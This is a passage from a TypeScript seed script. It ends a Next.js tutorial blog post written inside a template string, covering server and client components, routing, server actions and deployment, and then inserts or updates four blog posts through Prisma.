| **Execution Environment** | Executed purely on the Server. | Prerendered on the server, hydrated/run on the Client. |
| **Client Bundle Size** | **Zero**. No JS bundle is sent to the client. | Standard bundle size sent to the browser. |
| **Data Fetching** | Fetch database or external APIs asynchronously directly inside components. | Fetch data using hooks like \`useEffect\` or state libraries. |
| **Interactivity & State** | **Unsupported** (Cannot use \`useState\`, \`useEffect\`, or click listeners). | **Supported** (Full access to all hooks, state, and browser APIs). |

##### Example of a Server Component:
\`\`\`tsx
// app/blog/page.tsx (Runs strictly on the server)
import { prisma } from "@/lib/prisma";

export default async function BlogPage() {
  const posts = await prisma.blogPost.findMany(); // Query database directly!

  return (
    <main className="p-8">
      <h1>Tech Journal</h1>
      {posts.map(post => (
        <article key={post.id} className="mt-4">
          <h2>{post.title}</h2>
          <p>{post.excerpt}</p>
        </article>
      ))}
    </main>
  );
}
\`\`\`

##### Example of a Client Component:
To create a Client Component, place the \`"use client"\` directive at the absolute top of your file:
\`\`\`tsx
// components/Counter.tsx
"use client"; // Enforces client hydration

import { useState } from "react";

export function Counter() {
  const [count, setCount] = useState(0);

  return (
    <button onClick={() => setCount(count + 1)} className="px-4 py-2 bg-indigo-500 rounded">
      Click count: {count}
    </button>
  );
}
\`\`\`

---

### 5. Routing Patterns

#### 1. Dynamic Routing
To match parameters dynamically in the URL (e.g., \`/blog/first-post\`), wrap the folder name in square brackets:
\`\`\`text
app/
 └─ blog/
     └─ [slug]/
         └─ page.tsx
\`\`\`
Inside \`app/blog/[slug]/page.tsx\`, retrieve the dynamic slug parameters from the page props:
\`\`\`tsx
interface PageProps {
  params: Promise<{ slug: string }>;
}

export default async function BlogPostPage({ params }: PageProps) {
  const { slug } = await params;
  return <div>Reading blog post: {slug}</div>;
}
\`\`\`

#### 2. Route Groups
If you want to organize files without affecting the URL route (e.g., keeping authentication routes separated), wrap the folder name in parentheses:
\`\`\`text
app/
 ├─ (auth)/
 │   ├─ login/
 │   │   └─ page.tsx   --> Resolves to /login
 │   └─ signup/
 │       └─ page.tsx   --> Resolves to /signup
 └─ page.tsx
\`\`\`

---

### 6. Mutation & Data Safety: Server Actions
Server Actions allow Next.js client components to securely invoke server-side functions (such as database inserts or database updates) without exposing raw API endpoints or handling fetch headers manually.

#### 1. Server-side Action Definition (\`app/actions.ts\`):
\`\`\`typescript
"use server"; // Enforces function runs strictly on the server

import { prisma } from "@/lib/prisma";
import { revalidatePath } from "next/cache";

export async function addComment(formData: { name: string; text: string }) {
  if (!formData.name || !formData.text) {
    return { ok: false, error: "Validation failed." };
  }

  try {
    await prisma.comment.create({
      data: {
        name: formData.name,
        text: formData.text
      }
    });
    // Invalidate the cache to display the new comment instantly
    revalidatePath("/guestbook");
    return { ok: true };
  } catch (error) {
    return { ok: false, error: "Database transaction failed." };
  }
}
\`\`\`

#### 2. Client-side Invocation (\`app/guestbook/page.tsx\`):
\`\`\`tsx
"use client";

import { addComment } from "@/app/actions";
import { toast } from "sonner";

export default function Guestbook() {
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const res = await addComment({ name: "Alice", text: "Hello from client!" });
    if (res.ok) {
      toast.success("Comment saved!");
    }
  };

  return <form onSubmit={handleSubmit}>...</form>;
}
\`\`\`

---

### 7. Deployment Lifecycle
To host and compile your Next.js application for production:

1. **Build the Application**:
\`\`\`bash
npm run build
\`\`\`
This compiles and validates all routes, classifying them into Static (\`○\`) or Dynamic (\`ƒ\`) pages based on your data-fetching choices.

2. **Start the Production Server**:
\`\`\`bash
npm run start
\`\`\`
This runs the compiled application, handling active user sessions and routing queries securely.
`
  };

  try {
    console.log("Connecting to database to insert/update blog posts...");
    
    // Check & Seed Blog 1
    const existing1 = await prisma.blogPost.findFirst({
      where: { title: blog1.title }
    });
    if (!existing1) {
      const created1 = await prisma.blogPost.create({ data: blog1 });
      console.log(`Created Blog Post: "${created1.title}" (ID: ${created1.id})`);
    } else {
      const updated1 = await prisma.blogPost.update({
        where: { id: existing1.id },
        data: blog1
      });
      console.log(`Updated Blog Post: "${updated1.title}" (ID: ${updated1.id})`);
    }

    // Check & Seed Blog 2
    const existing2 = await prisma.blogPost.findFirst({
      where: { title: blog2.title }
    });
    if (!existing2) {
      const created2 = await prisma.blogPost.create({ data: blog2 });
      console.log(`Created Blog Post: "${created2.title}" (ID: ${created2.id})`);
    } else {
      const updated2 = await prisma.blogPost.update({
        where: { id: existing2.id },
        data: blog2
      });
      console.log(`Updated Blog Post: "${updated2.title}" (ID: ${updated2.id})`);
    }

    // Check & Seed Blog 3
    const existing3 = await prisma.blogPost.findFirst({
      where: { title: blog3.title }
    });
    if (!existing3) {
      const created3 = await prisma.blogPost.create({ data: blog3 });
      console.log(`Created Blog Post: "${created3.title}" (ID: ${created3.id})`);
    } else {
      const updated3 = await prisma.blogPost.update({
        where: { id: existing3.id },
        data: blog3
      });
      console.log(`Updated Blog Post: "${updated3.title}" (ID: ${updated3.id})`);
    }

    // Check & Seed Blog 4
    const existing4 = await prisma.blogPost.findFirst({
      where: { title: blog4.title }
    });
    if (!existing4) {
      const created4 = await prisma.blogPost.create({ data: blog4 });
      console.log(`Created Blog Post: "${created4.title}" (ID: ${created4.id})`);
    } else {
      const updated4 = await prisma.blogPost.update({
        where: { id: existing4.id },
        data: blog4
      });
      console.log(`Updated Blog Post: "${updated4.title}" (ID: ${updated4.id})`);
    }

    console.log("Seeding complete!");
  } catch (error) {
    console.error("Database seeding failed:", error);
  } finally {
    await prisma.$disconnect();
  }
}

seedBlogs();
